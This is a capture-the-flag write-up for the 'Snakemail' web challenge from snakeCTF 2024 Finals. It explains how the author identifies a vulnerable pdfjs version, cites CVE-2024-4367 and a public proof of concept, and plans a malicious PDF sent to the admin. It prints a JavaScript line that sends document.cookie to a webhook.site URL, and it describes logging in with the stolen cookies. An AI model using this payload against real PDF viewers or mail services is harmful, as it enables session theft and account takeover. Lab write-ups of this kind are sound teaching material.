# Snakemail [_snakeCTF 2024 Finals_]

**Category**: Web

## Description

Apparently, the admin has a secret hidden in his emails. Can you find it?

(admin email is `admin@mail.snakectf.org`)

## Solution

### Step 1: Analysing the frontend

The initial step involves inspecting how the frontend works. Users can attach files to an email. The allowed file types are: PNG, JPEG, GIF, WEBP, PDF, DOC, DOCX, XLS, XLSX. When a PDF file is viewed in an email, the page that renders the PDF preview can be identified as `/pdf?email=...&id=...`.

By examining the Webpack chunk files, the library responsible for rendering the PDF files, `pdfjs`, is identified. Investigating the library's source code reveals a variable, `apiVersion`, which stores the version number of the library. Searching for this variable in the chunk files uncovers the library version, `4.1.392`.

### Step 2: Exploiting the PDF viewer

Searching online for the library's version number leads to the discovery of a [security advisory](https://nvd.nist.gov/vuln/detail/CVE-2024-4367) describing a vulnerability in the library. This vulnerability enables an attacker to execute arbitrary JavaScript code within the PDF viewer's context. A [proof of concept](https://github.com/LOURC0D3/CVE-2024-4367-PoC) demonstrates how to exploit this issue.

A malicious PDF file can be crafted to exploit this vulnerability and sent to the admin's email address to steal the cookies. An example payload is provided below:

```javascript
fetch('https://webhook.site/your-uuid?cookie=' + btoa(document.cookie));
```

When the admin opens the PDF, the cookies are exfiltrated to the specified webhook.

### Step 3: Logging in as the admin

After obtaining the admin's cookies, they can be used to log in as the admin. The secret hidden in the admin’s emails can then be accessed.